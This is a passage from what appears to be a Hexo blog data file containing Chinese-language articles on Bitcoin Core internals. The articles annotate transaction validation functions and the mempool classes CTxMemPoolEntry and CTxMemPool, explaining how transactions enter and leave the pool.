class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bool CheckTransaction(const CTransaction&amp; tx, CValidationState &amp;state, bool fCheckDuplicateInputs)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    // 不依赖于上下文的基础性检查</span><br><span class=\"line\">    // 校验输入是否为空，每笔交易都需有来源</span><br><span class=\"line\">    if (tx.vin.empty())</span><br><span class=\"line\">        return state.DoS(10, false, REJECT_INVALID, &quot;bad-txns-vin-empty&quot;);</span><br><span class=\"line\">    // 校验输出是否为空，每笔钱都应有去向</span><br><span class=\"line\">    if (tx.vout.empty())</span><br><span class=\"line\">        return state.DoS(10, false, REJECT_INVALID, &quot;bad-txns-vout-empty&quot;);</span><br><span class=\"line\">    // 大小校验 不考虑隔离见证数据</span><br><span class=\"line\">    if (::GetSerializeSize(tx, SER_NETWORK, PROTOCOL_VERSION | SERIALIZE_TRANSACTION_NO_WITNESS) * WITNESS_SCALE_FACTOR &gt; MAX_BLOCK_WEIGHT)</span><br><span class=\"line\">        return state.DoS(100, false, REJECT_INVALID, &quot;bad-txns-oversize&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    // 校验输出值是否有效</span><br><span class=\"line\">    CAmount nValueOut = 0;</span><br><span class=\"line\">    for (const auto&amp; txout : tx.vout)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if (txout.nValue &lt; 0)</span><br><span class=\"line\">            return state.DoS(100, false, REJECT_INVALID, &quot;bad-txns-vout-negative&quot;);</span><br><span class=\"line\">        if (txout.nValue &gt; MAX_MONEY)</span><br><span class=\"line\">            return state.DoS(100, false, REJECT_INVALID, &quot;bad-txns-vout-toolarge&quot;);</span><br><span class=\"line\">        nValueOut += txout.nValue;</span><br><span class=\"line\">        if (!MoneyRange(nValueOut))</span><br><span class=\"line\">            return state.DoS(100, false, REJECT_INVALID, &quot;bad-txns-txouttotal-toolarge&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 校验重复输入 注意该校验比较耗时，所以我们在CheckBlock时，跳过该步骤</span><br><span class=\"line\">    if (fCheckDuplicateInputs) &#123;</span><br><span class=\"line\">        std::set&lt;COutPoint&gt; vInOutPoints;</span><br><span class=\"line\">        for (const auto&amp; txin : tx.vin)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            if (!vInOutPoints.insert(txin.prevout).second)</span><br><span class=\"line\">                return state.DoS(100, false, REJECT_INVALID, &quot;bad-txns-inputs-duplicate&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 对coinbase交易进行校验</span><br><span class=\"line\">    if (tx.IsCoinBase())</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        // 检验coinbase的scriptSig大小是否在[2,100]范围内</span><br><span class=\"line\">        if (tx.vin[0].scriptSig.size() &lt; 2 || tx.vin[0].scriptSig.size() &gt; 100)</span><br><span class=\"line\">            return state.DoS(100, false, REJECT_INVALID, &quot;bad-cb-length&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        for (const auto&amp; txin : tx.vin)</span><br><span class=\"line\">            // 每笔交易必须有来源</span><br><span class=\"line\">            if (txin.prevout.IsNull())</span><br><span class=\"line\">                return state.DoS(10, false, REJECT_INVALID, &quot;bad-txns-prevout-null&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://github.com/bitcoin/bitcoin/blob/3fa24bb217b207d964acd4db4cb5df085a7d3ce5/src/validation.cpp#L1351\" target=\"_blank\" rel=\"noopener\">校验输入</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 检查指定交易的所有输入是否有效（不存在双花）</span><br><span class=\"line\">bool CheckInputs(const CTransaction&amp; tx, CValidationState &amp;state, const CCoinsViewCache &amp;inputs, bool fScriptChecks, unsigned int flags, bool cacheSigStore, bool cacheFullScriptStore, PrecomputedTransactionData&amp; txdata, std::vector&lt;CScriptCheck&gt; *pvChecks)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (!tx.IsCoinBase())</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if (pvChecks)</span><br><span class=\"line\">            pvChecks-&gt;reserve(tx.vin.size());</span><br><span class=\"line\"></span><br><span class=\"line\">        if (fScriptChecks) &#123;</span><br><span class=\"line\">            uint256 hashCacheEntry;</span><br><span class=\"line\">            static_assert(55 - sizeof(flags) - 32 &gt;= 128/8, &quot;Want at least 128 bits of nonce for script execution cache&quot;);</span><br><span class=\"line\">            CSHA256().Write(scriptExecutionCacheNonce.begin(), 55 - sizeof(flags) - 32).Write(tx.GetWitnessHash().begin(), 32).Write((unsigned char*)&amp;flags, sizeof(flags)).Finalize(hashCacheEntry.begin());</span><br><span class=\"line\">            AssertLockHeld(cs_main);</span><br><span class=\"line\">            if (scriptExecutionCache.contains(hashCacheEntry, !cacheFullScriptStore)) &#123;</span><br><span class=\"line\">                return true;</span><br><span class=\"line\">            &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">            for (unsigned int i = 0; i &lt; tx.vin.size(); i++) &#123;</span><br><span class=\"line\">                const COutPoint &amp;prevout = tx.vin[i].prevout;</span><br><span class=\"line\">                const Coin&amp; coin = inputs.AccessCoin(prevout);</span><br><span class=\"line\">                assert(!coin.IsSpent());</span><br><span class=\"line\"></span><br><span class=\"line\">                CScriptCheck check(coin.out, tx, i, flags, cacheSigStore, &amp;txdata);</span><br><span class=\"line\">                if (pvChecks) &#123;</span><br><span class=\"line\">                    pvChecks-&gt;push_back(CScriptCheck());</span><br><span class=\"line\">                    check.swap(pvChecks-&gt;back());</span><br><span class=\"line\">                &#125; else if (!check()) &#123;</span><br><span class=\"line\">                    if (flags &amp; STANDARD_NOT_MANDATORY_VERIFY_FLAGS) &#123;</span><br><span class=\"line\">                         CScriptCheck check2(coin.out, tx, i, flags &amp; ~STANDARD_NOT_MANDATORY_VERIFY_FLAGS, cacheSigStore, &amp;txdata);</span><br><span class=\"line\">                    if (check2())</span><br><span class=\"line\">                        return state.Invalid(false, REJECT_NONSTANDARD, strprintf(&quot;non-mandatory-script-verify-flag (%s)&quot;, ScriptErrorString(check.GetScriptError())));</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                return state.DoS(100,false, REJECT_INVALID, strprintf(&quot;mandatory-script-verify-flag-failed (%s)&quot;, ScriptErrorString(check.GetScriptError())));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if (cacheFullScriptStore &amp;&amp; !pvChecks) &#123;</span><br><span class=\"line\">            scriptExecutionCache.insert(hashCacheEntry);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"比特币挖矿之交易池","comments":0,"date":"2018-03-16T02:17:45.000Z","img":null,"_content":"在[比特币挖矿之矿工任务](http://c60block.com/2018/02/28/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E7%9F%BF%E5%B7%A5%E4%BB%BB%E5%8A%A1/)中我们提到，矿工会监听交易广播，并把通过验证的交易放入本地交易池。当然矿工可以通过设置最低交易费等规则来控制交易池的大小，在一个区块完成竞争后，矿工会按照一定的规则，从交易池中取出交易，在保证大部分交易都能得到打包的情况下，赚取更多的手续费。这儿交易池的作用就是在本地存放未确认的交易，作为区块打包的仓库，一笔交易被收录进交易池的流程如下：\n1、验证交易是否有效（是否是规范交易，是否双花，签名是否有效，支付方是否有足够的余额），如果无效直接拒绝\n2、验证是否是孤儿交易，如果是，本地保存，不转发，防DDOS攻击\n3、按照一定排序规则加入交易池\n\n当然交易池中也存在交易清理机制，当出现如下情况时，交易会被清理出交易池：\n1、交易池达到上限，会将交易池中排名末端的交易剔除出去\n2、出现交易双花，满足交易替换规则（手续费更高的会被留下），低手续费交易及其子孙交易会被剔除出去\n3、最新块中已经包含的交易会被剔除掉\n4、与最新块中已经包含交易冲突的交易及其子孙交易会被剔除掉\n5、交易在交易池中存在时间过长\n\n在比特币系统中，使用CTxMemPoolEntry来封装被接受的交易，使用CTxMemPool对象来表示整个交易池信息。\n[CTxMemPoolEntry](https://github.com/bitcoin/bitcoin/blob/master/src/txmempool.h#L64):\n```\nclass CTxMemPoolEntry\n{\nprivate:\n    // 交易引用\n    CTransactionRef tx;\n    // 交易费\n    CAmount nFee;\n    // 交易weight\n    size_t nTxWeight;\n    // 大小\n    size_t nUsageSize;\n    // 加入交易池时间\n    int64_t nTime;\n    // 加入交易池时区块高度\n    unsigned int entryHeight;\n    // 上笔交易来源于Coinbase交易\n    bool spendsCoinbase;\n\n    int64_t sigOpCost;\n    // 此参数用来决定该笔交易的挖矿优先级\n    int64_t feeDelta;\n    // 该笔交易在加入区块链前区块的高度和时间\n    LockPoints lockPoints;\n    \n    // 子孙交易信息，当剔除该交易时，所有子孙交易也必须同时剔除掉\n    // 子孙交易数量\n    uint64_t nCountWithDescendants;\n    // 子孙交易总大小\n    uint64_t nSizeWithDescendants;\n    // 子孙交易交易费之和\n    CAmount nModFeesWithDescendants;\n\n    // 祖先交易信息，当剔除该交易时，对应的祖先交易也应更新子孙信息\n    // 祖先交易数量\n    uint64_t nCountWithAncestors;\n    // 祖先交易大小\n    uint64_t nSizeWithAncestors;\n    // 祖先交易总手续费之和\n    CAmount nModFeesWithAncestors;\n\n    int64_t nSigOpCostWithAncestors;\n\n    // 成员方法\n    ...\n\n};\n```\n我们注意到CTxMemPoolEntry对象不只包括交易本身的信息。还包括子孙交易和祖先交易信息，这些信息将在交易加入交易池排序时用到，下文将会具体介绍。\n\n[CTxMemPool](https://github.com/bitcoin/bitcoin/blob/master/src/txmempool.h#L440)\n```\nclass CTxMemPool\n{\nprivate:\n    // 在2^32时间内检查的次数\n    uint32_t nCheckFrequency;\n    \n    unsigned int nTransactionsUpdated;\n    CBlockPolicyEstimator* minerPolicyEstimator;\n    \n    // 交易池中所有交易的虚拟大小，不包括隔离见证数据\n    uint64_t totalTxSize;\n    // mapTx中所有元素的动态内存大小之和\n    uint64_t cachedInnerUsage;\n\n    mutable int64_t lastRollingFeeUpdate;\n    mutable bool blockSinceLastRollingFeeBump;\n    // 进入交易池的最小交易费\n    mutable double rollingMinimumFeeRate;\n    \n\n    void trackPackageRemoved(const CFeeRate& rate);\n\npublic:\n    \n    static const int ROLLING_FEE_HALFLIFE = 60 * 60 * 12; // public only for testing\n\n    // 将CTxMemPoolEntry按照交易Hash，交易费率，加入交易池时间，祖先交易费率加入到多索引容器中\n    // 这儿的排序直接决定了交易被打包进区块和剔除出交易池的先后顺序\n    typedef boost::multi_index_container<\n        CTxMemPoolEntry,\n        boost::multi_index::indexed_by<\n            // 以txid排序\n            boost::multi_index::hashed_unique<mempoolentry_txid, SaltedTxidHasher>,\n            // 以交易费率排序\n            boost::multi_index::ordered_non_unique<\n                boost::multi_index::tag<descendant_score>,\n                boost::multi_index::identity<CTxMemPoolEntry>,\n                CompareTxMemPoolEntryByDescendantScore\n            >,\n            // 以交易加入交易池时间排序\n            boost::multi_index::ordered_non_unique<\n                boost::multi_index::tag<entry_time>,\n                boost::multi_index::identity<CTxMemPoolEntry>,\n                CompareTxMemPoolEntryByEntryTime\n            >,\n            // 以祖先交易费率排序\n            boost::multi_index::ordered_non_unique<\n                boost::multi_index::tag<ancestor_score>,\n                boost::multi_index::identity<CTxMemPoolEntry>,\n                CompareTxMemPoolEntryByAncestorFee\n            >\n        >\n    > indexed_transaction_set;\n\n    mutable CCriticalSection cs;\n    // 满足交易池加入条件的交易都将缓存到mapTx中\n    indexed_transaction_set mapTx;\n\n    // 以txid为索引的迭代器\n    typedef indexed_transaction_set::nth_index<0>::type::iterator txiter;\n    // \n    std::vector<std::pair<uint256, txiter> > vTxHashes;\n\n    // Hash比较器\n    struct CompareIteratorByHash {\n        bool operator()(const txiter &a, const txiter &b) const {\n            return a->GetTx().GetHash() < b->GetTx().GetHash();\n        }\n    };\n    typedef std::set<txiter, CompareIteratorByHash> setEntries;\n    \n    // 获取当前交易池中的父辈交易集合\n    const setEntries & GetMemPoolParents(txiter entry) const;\n    // 获取当前交易池中的子辈交易集合\n    const setEntries & GetMemPoolChildren(txiter entry) const;\nprivate:\n    typedef std::map<txiter, setEntries, CompareIteratorByHash> cacheMap;\n\n    struct TxLinks {\n        setEntries parents;\n        setEntries children;\n    };\n\n    // 缓存交易与祖先交易和子孙交易的关联\n    typedef std::map<txiter, TxLinks, CompareIteratorByHash> txlinksMap;\n    txlinksMap mapLinks;\n\n    // 更新父辈交易的状态\n    void UpdateParent(txiter entry, txiter parent, bool add);\n    // 更新子辈交易的状态\n    void UpdateChild(txiter entry, txiter child, bool add);\n    \n    // 返回根据祖先交易数量排序的交易集合\n    std::vector<indexed_transaction_set::const_iterator> GetSortedDepthAndScore() const;\n\npublic:\n    // 缓存交易来源与交易的关联\n    indirectmap<COutPoint, const CTransaction*> mapNextTx;\n    std::map<uint256, CAmount> mapDeltas;\n\n    // 创建一个新交易池，只能显式创建\n    explicit CTxMemPool(CBlockPolicyEstimator* estimator = nullptr);\n    \n    // 如果开启了sanity-checking，check函数将保证交易池的一致性（不存在双花的情况），如果关闭sanity-checking，则什么都不做\n    void check(const CCoinsViewCache *pcoins) const;\n    // 设置sanity-checking ncheckFrequency 默认为2^32-1\n    void setSanityCheck(double dFrequency = 1.0) { nCheckFrequency = static_cast<uint32_t>(dFrequency * 4294967295.0); }\n    \n    // 将一笔交易加入交易池\n    bool addUnchecked(const uint256& hash, const CTxMemPoolEntry &entry, bool validFeeEstimate = true);\n    bool addUnchecked(const uint256& hash, const CTxMemPoolEntry &entry, setEntries &setAncestors, bool validFeeEstimate = true);\n\n    // 将交易剔除出交易池\n    // 剔除交易及其子孙交易\n    void removeRecursive(const CTransaction &tx, MemPoolRemovalReason reason = MemPoolRemovalReason::UNKNOWN);\n    // 剔除来源为coinbase交易，但是没有成熟，所在区块最终成为孤儿块的情况\n    void removeForReorg(const CCoinsViewCache *pcoins, unsigned int nMemPoolHeight, int flags);\n    // 剔除与已记录在区块链中交易冲突的交易及子孙交易（双花，该交易加入交易池时，另外一笔交易可能尚未被加入到区块链上）\n    void removeConflicts(const CTransaction &tx);\n    // 当节点接收到一个新块时，剔除已经打包进区块中的交易以及冲突交易\n    void removeForBlock(const std::vector<CTransactionRef>& vtx, unsigned int nBlockHeight);\n    \n    // 清空交易池\n    void clear();\n    void _clear();\n\n    // 比较两笔交易的祖先交易数量，当数量相等时，比较交易费率\n    bool CompareDepthAndScore(const uint256& hasha, const uint256& hashb);\n    \n    void queryHashes(std::vector<uint256>& vtxid);\n    // 盘算交易的来源是否是CoinBase交易\n    bool isSpent(const COutPoint& outpoint);\n    // 获取交易更新的次数\n    unsigned int GetTransactionsUpdated() const;\n    // 调整交易更新的次数\n    void AddTransactionsUpdated(unsigned int n);\n\n    // 判断交易中是否存在input为空的情况\n    bool HasNoInputsOf(const CTransaction& tx) const;\n    // 调整CreateNewBlock时交易的优先级\n    void PrioritiseTransaction(const uint256& hash, const CAmount& nFeeDelta);\n    // \n    void ApplyDelta(const uint256 hash, CAmount &nFeeDelta) const;\n    // \n    void ClearPrioritisation(const uint256 hash);\n\npublic:\n    \n    // 从交易池中剔除一组交易。如果一笔交易在这个集合中，那么该笔交易在交易池中的所有子孙交易都应该在该集合中\n    // 除非这笔交易是因为被包含在一个区块中而被剔除。\n    // 当因为一笔交易被包含在区块中而删除时，设置updateDescendants为真，这样所有在该交易池中的子孙交易可以将他们的祖先交易状态更新\n    void RemoveStaged(setEntries &stage, bool updateDescendants, MemPoolRemovalReason reason = MemPoolRemovalReason::UNKNOWN);\n    \n    // 将孤块中包含的交易信息更新到交易池\n    void UpdateTransactionsFromBlock(const std::vector<uint256> &vHashesToUpdate);\n\n    // 计算交易池中指定交易的所有祖先交易（包含该交易本身）\n    bool CalculateMemPoolAncestors(const CTxMemPoolEntry &entry, \n                                   setEntries &setAncestors, \n                                   uint64_t limitAncestorCount, \n                                   uint64_t limitAncestorSize,\n                                   uint64_t limitDescendantCount, \n                                   uint64_t limitDescendantSize, \n                                   std::string &errString, \n                                   bool fSearchForParents = true\n                                  ) const;\n\n    // 计算交易池中指定交易的子孙交易\n    void CalculateDescendants(txiter it, setEntries &setDescendants);\n\n    CFeeRate GetMinFee(size_t sizelimit) const;\n\n    void TrimToSize(size_t sizelimit, std::vector<COutPoint>* pvNoSpendsRemaining=nullptr);\n\n    // 剔除交易池中比指定时间早的交易，并将剔除的个数返回\n    int Expire(int64_t time);\n\n    // 当交易在交易池中，并且不满足指定链限制时，返回假\n    bool TransactionWithinChainLimit(const uint256& txid, size_t chainLimit) const;\n    \n    // 返回mapTx中交易个数，即交易池中交易个数\n    unsigned long size()\n    {\n        LOCK(cs);\n        return mapTx.size();\n    }\n    \n    // 返回交易池中所有交易的虚拟大小总和，不包括见证数据\n    uint64_t GetTotalTxSize() const\n    {\n        LOCK(cs);\n        return totalTxSize;\n    }\n    \n    // 查询一笔交易是否在当前交易池中\n    bool exists(uint256 hash) const\n    {\n        LOCK(cs);\n        return (mapTx.count(hash) != 0);\n    }\n\n    // 获取指定hash值对应的交易引用\n    CTransactionRef get(const uint256& hash) const;\n    // 获得交易池中交易信息\n    TxMempoolInfo info(const uint256& hash) const;\n    // 获得交易池中所有交易信息\n    std::vector<TxMempoolInfo> infoAll() const;\n    \n    // 获得动态内存大小\n    size_t DynamicMemoryUsage() const;\n\n    boost::signals2::signal<void (CTransactionRef)> NotifyEntryAdded;\n    boost::signals2::signal<void (CTransactionRef, MemPoolRemovalReason)> NotifyEntryRemoved;\n\nprivate:\n    // 更新子孙交易状态 \n    void UpdateForDescendants(txiter updateIt,cacheMap &cachedDescendants,const std::set<uint256> &setExclude);\n    // 更新祖先交易状态\n    void UpdateAncestorsOf(bool add, txiter hash, setEntries &setAncestors);\n    // 更新指定交易的祖先状态\n    void UpdateEntryForAncestors(txiter it, const setEntries &setAncestors);\n    // 当一笔交易从交易池中剔除时，需更新其祖先和所有直接的儿子交易\n    // 当updateDescendants为真时，也同时更新交易池中子孙交易的祖先交易状态\n    void UpdateForRemoveFromMempool(const setEntries &entriesToRemove, bool updateDescendants);\n    // 更新父子交易关联\n    void UpdateChildrenForRemoval(txiter entry);\n    // 对于一个特定的交易，调用 removeUnchecked之前，必须为同时为要移除的交易集合调用UpdateForRemoveFromMempool。\n    void removeUnchecked(txiter entry, MemPoolRemovalReason reason = MemPoolRemovalReason::UNKNOWN);\n\n};\n```\n","source":"_posts/比特币挖矿之交易池.md","raw":"---\ntitle: 比特币挖矿之交易池\ncomments: false\ndate: 2018-03-16 10:17:45\ncategories: 矿池\ntags:\n- LeonBCK\n- 比特币\n- 交易池\nimg:\n---\n在[比特币挖矿之矿工任务](http://c60block.com/2018/02/28/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E7%9F%BF%E5%B7%A5%E4%BB%BB%E5%8A%A1/)中我们提到，矿工会监听交易广播，并把通过验证的交易放入本地交易池。当然矿工可以通过设置最低交易费等规则来控制交易池的大小，在一个区块完成竞争后，矿工会按照一定的规则，从交易池中取出交易，在保证大部分交易都能得到打包的情况下，赚取更多的手续费。这儿交易池的作用就是在本地存放未确认的交易，作为区块打包的仓库，一笔交易被收录进交易池的流程如下：\n1、验证交易是否有效（是否是规范交易，是否双花，签名是否有效，支付方是否有足够的余额），如果无效直接拒绝\n2、验证是否是孤儿交易，如果是，本地保存，不转发，防DDOS攻击\n3、按照一定排序规则加入交易池\n\n当然交易池中也存在交易清理机制，当出现如下情况时，交易会被清理出交易池：\n1、交易池达到上限，会将交易池中排名末端的交易剔除出去\n2、出现交易双花，满足交易替换规则（手续费更高的会被留下），低手续费交易及其子孙交易会被剔除出去\n3、最新块中已经包含的交易会被剔除掉\n4、与最新块中已经包含交易冲突的交易及其子孙交易会被剔除掉\n5、交易在交易池中存在时间过长\n\n在比特币系统中，使用CTxMemPoolEntry来封装被接受的交易，使用CTxMemPool对象来表示整个交易池信息。\n[CTxMemPoolEntry](https://github.com/bitcoin/bitcoin/blob/master/src/txmempool.h#L64):\n```\nclass CTxMemPoolEntry\n{\nprivate:\n    // 交易引用\n    CTransactionRef tx;\n    // 交易费\n    CAmount nFee;\n    // 交易weight\n    size_t nTxWeight;\n    // 大小\n    size_t nUsageSize;\n    // 加入交易池时间\n    int64_t nTime;\n    // 加入交易池时区块高度\n    unsigned int entryHeight;\n    // 上笔交易来源于Coinbase交易\n    bool spendsCoinbase;\n\n    int64_t sigOpCost;\n    // 此参数用来决定该笔交易的挖矿优先级\n    int64_t feeDelta;\n    // 该笔交易在加入区块链前区块的高度和时间\n    LockPoints lockPoints;\n    \n    // 子孙交易信息，当剔除该交易时，所有子孙交易也必须同时剔除掉\n    // 子孙交易数量\n    uint64_t nCountWithDescendants;\n    // 子孙交易总大小\n    uint64_t nSizeWithDescendants;\n    // 子孙交易交易费之和\n    CAmount nModFeesWithDescendants;\n\n    // 祖先交易信息，当剔除该交易时，对应的祖先交易也应更新子孙信息\n    // 祖先交易数量\n    uint64_t nCountWithAncestors;\n    // 祖先交易大小\n    uint64_t nSizeWithAncestors;\n    // 祖先交易总手续费之和\n    CAmount nModFeesWithAncestors;\n\n    int64_t nSigOpCostWithAncestors;\n\n    // 成员方法\n    ...\n\n};\n```\n我们注意到CTxMemPoolEntry对象不只包括交易本身的信息。还包括子孙交易和祖先交易信息，这些信息将在交易加入交易池排序时用到，下文将会具体介绍。\n\n[CTxMemPool](https://github.com/bitcoin/bitcoin/blob/master/src/txmempool.h#L440)\n```\nclass CTxMemPool\n{\nprivate:\n    // 在2^32时间内检查的次数\n    uint32_t nCheckFrequency;\n    \n    unsigned int nTransactionsUpdated;\n    CBlockPolicyEstimator* minerPolicyEstimator;\n    \n    // 交易池中所有交易的虚拟大小，不包括隔离见证数据\n    uint64_t totalTxSize;\n    // mapTx中所有元素的动态内存大小之和\n    uint64_t cachedInnerUsage;\n\n    mutable int64_t lastRollingFeeUpdate;\n    mutable bool blockSinceLastRollingFeeBump;\n    // 进入交易池的最小交易费\n    mutable double rollingMinimumFeeRate;\n    \n\n    void trackPackageRemoved(const CFeeRate& rate);\n\npublic:\n    \n    static const int ROLLING_FEE_HALFLIFE = 60 * 60 * 12; // public only for testing\n\n    // 将CTxMemPoolEntry按照交易Hash，交易费率，加入交易池时间，祖先交易费率加入到多索引容器中\n    // 这儿的排序直接决定了交易被打包进区块和剔除出交易池的先后顺序\n    typedef boost::multi_index_container<\n        CTxMemPoolEntry,\n        boost::multi_index::indexed_by<\n            // 以txid排序\n            boost::multi_index::hashed_unique<mempoolentry_txid, SaltedTxidHasher>,\n            // 以交易费率排序\n            boost::multi_index::ordered_non_unique<\n                boost::multi_index::tag<descendant_score>,\n                boost::multi_index::identity<CTxMemPoolEntry>,\n                CompareTxMemPoolEntryByDescendantScore\n            >,\n            // 以交易加入交易池时间排序\n            boost::multi_index::ordered_non_unique<\n                boost::multi_index::tag<entry_time>,\n                boost::multi_index::identity<CTxMemPoolEntry>,\n                CompareTxMemPoolEntryByEntryTime\n            >,\n            // 以祖先交易费率排序\n            boost::multi_index::ordered_non_unique<\n                boost::multi_index::tag<ancestor_score>,\n                boost::multi_index::identity<CTxMemPoolEntry>,\n                CompareTxMemPoolEntryByAncestorFee\n            >\n        >\n    > indexed_transaction_set;\n\n    mutable CCriticalSection cs;\n    // 满足交易池加入条件的交易都将缓存到mapTx中\n    indexed_transaction_set mapTx;\n\n    // 以txid为索引的迭代器\n    typedef indexed_transaction_set::nth_index<0>::type::iterator txiter;\n    // \n    std::vector<std::pair<uint256, txiter> > vTxHashes;\n\n    // Hash比较器\n    struct CompareIteratorByHash {\n        bool operator()(const txiter &a, const txiter &b) const {\n            return a->GetTx().GetHash() < b->GetTx().GetHash();\n        }\n    };\n    typedef std::set<txiter, CompareIteratorByHash> setEntries;\n    \n    // 获取当前交易池中的父辈交易集合\n    const setEntries & GetMemPoolParents(txiter entry) const;\n    // 获取当前交易池中的子辈交易集合\n    const setEntries & GetMemPoolChildren(txiter entry) const;\nprivate:\n    typedef std::map<txiter, setEntries, CompareIteratorByHash> cacheMap;\n\n    struct TxLinks {\n        setEntries parents;\n        setEntries children;\n    };\n\n    // 缓存交易与祖先交易和子孙交易的关联\n    typedef std::map<txiter, TxLinks, CompareIteratorByHash> txlinksMap;\n    txlinksMap mapLinks;\n\n    // 更新父辈交易的状态\n    void UpdateParent(txiter entry, txiter parent, bool add);\n    // 更新子辈交易的状态\n    void UpdateChild(txiter entry, txiter child, bool add);\n    \n    // 返回根据祖先交易数量排序的交易集合\n    std::vector<indexed_transaction_set::const_iterator> GetSortedDepthAndScore() const;\n\npublic:\n    // 缓存交易来源与交易的关联\n    indirectmap<COutPoint, const CTransaction*> mapNextTx;\n    std::map<uint256, CAmount> mapDeltas;\n\n    // 创建一个新交易池，只能显式创建\n    explicit CTxMemPool(CBlockPolicyEstimator* estimator = nullptr);\n    \n    // 如果开启了sanity-checking，check函数将保证交易池的一致性（不存在双花的情况），如果关闭sanity-checking，则什么都不做\n    void check(const CCoinsViewCache *pcoins) const;\n    // 设置sanity-checking ncheckFrequency 默认为2^32-1\n    void setSanityCheck(double dFrequency = 1.0) { nCheckFrequency = static_cast<uint32_t>(dFrequency * 4294967295.0); }\n    \n    // 将一笔交易加入交易池\n    bool addUnchecked(const uint256& hash, const CTxMemPoolEntry &entry, bool validFeeEstimate = true);\n    bool addUnchecked(const uint256& hash, const CTxMemPoolEntry &entry, setEntries &setAncestors, bool validFeeEstimate = true);\n\n    // 将交易剔除出交易池\n    // 剔除交易及其子孙交易\n    void removeRecursive(const CTransaction &tx, MemPoolRemovalReason reason = MemPoolRemovalReason::UNKNOWN);\n    // 剔除来源为coinbase交易，但是没有成熟，所在区块最终成为孤儿块的情况\n    void removeForReorg(const CCoinsViewCache *pcoins, unsigned int nMemPoolHeight, int flags);\n    // 剔除与已记录在区块链中交易冲突的交易及子孙交易（双花，该交易加入交易池时，另外一笔交易可能尚未被加入到区块链上）\n    void removeConflicts(const CTransaction &tx);\n    // 当节点接收到一个新块时，剔除已经打包进区块中的交易以及冲突交易\n    void removeForBlock(const std::vector<CTransactionRef>& vtx, unsigned int nBlockHeight);\n    \n    // 清空交易池\n    void clear();\n    void _clear();\n\n    // 比较两笔交易的祖先交易数量，当数量相等时，比较交易费率\n    bool CompareDepthAndScore(const uint256& hasha, const uint256& hashb);\n    \n    void queryHashes(std::vector<uint256>& vtxid);\n    // 盘算交易的来源是否是CoinBase交易\n    bool isSpent(const COutPoint& outpoint);\n    // 获取交易更新的次数\n    unsigned int GetTransactionsUpdated() const;\n    // 调整交易更新的次数\n    void AddTransactionsUpdated(unsigned int n);\n\n    // 判断交易中是否存在input为空的情况\n    bool HasNoInputsOf(const CTransaction& tx) const;\n    // 调整CreateNewBlock时交易的优先级\n    void PrioritiseTransaction(const uint256& hash, const CAmount& nFeeDelta);\n    // \n    void ApplyDelta(const uint256 hash, CAmount &nFeeDelta) const;\n    // \n    void ClearPrioritisation(const uint256 hash);\n\npublic:\n    \n    // 从交易池中剔除一组交易。如果一笔交易在这个集合中，那么该笔交易在交易池中的所有子孙交易都应该在该集合中\n    // 除非这笔交易是因为被包含在一个区块中而被剔除。\n    // 当因为一笔交易被包含在区块中而删除时，设置updateDescendants为真，这样所有在该交易池中的子孙交易可以将他们的祖先交易状态更新\n    void RemoveStaged(setEntries &stage, bool updateDescendants, MemPoolRemovalReason reason = MemPoolRemovalReason::UNKNOWN);\n    \n    // 将孤块中包含的交易信息更新到交易池\n    void UpdateTransactionsFromBlock(const std::vector<uint256> &vHashesToUpdate);\n\n    // 计算交易池中指定交易的所有祖先交易（包含该交易本身）\n    bool CalculateMemPoolAncestors(const CTxMemPoolEntry &entry, \n                                   setEntries &setAncestors, \n                                